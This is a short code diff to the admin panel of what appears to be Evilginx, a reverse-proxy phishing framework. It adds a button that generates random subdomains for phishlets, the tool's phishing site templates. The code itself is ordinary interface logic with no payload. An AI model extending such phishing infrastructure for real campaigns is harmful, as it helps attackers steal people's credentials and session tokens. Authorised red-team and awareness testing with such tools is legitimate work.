@@ -440,13 +440,32 @@ class EvilginxAdmin {
         this.openModal('Set Hostname', `
             <div class="form-group">
                 <label for="phishlet-hostname">Hostname for ${name}</label>
-                <input type="text" id="phishlet-hostname" value="${currentHostname}" placeholder="subdomain.yourdomain.com">
-                <p class="form-hint">Must end with your base domain</p>
+                <div style="display: flex; gap: 8px;">
+                    <input type="text" id="phishlet-hostname" value="${currentHostname}" placeholder="subdomain.yourdomain.com" style="flex: 1;">
+                    <button class="btn btn-secondary" onclick="admin.generateHostname('${name}')" title="Generate Random">
+                        🎲 Generate
+                    </button>
+                </div>
+                <p class="form-hint">Click "Generate" to auto-create a random subdomain, or enter manually</p>
             </div>
         `, `
             <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
             <button class="btn btn-primary" onclick="admin.setPhishletHostname('${name}')">Save</button>
         `);
+    }
+
+    async generateHostname(name) {
+        const result = await this.apiRequest(`/phishlets/${name}/hostname/generate`, {
+            method: 'POST'
+        });
+        
+        if (result.success) {
+            // Update the input field with generated hostname
+            document.getElementById('phishlet-hostname').value = result.data.hostname;
+            this.toast('success', 'Hostname Generated', `Random hostname created: ${result.data.hostname}`);
+        } else {
+            this.toast('error', 'Error', result.message);
+        }
     }
 
     async setPhishletHostname(name) {
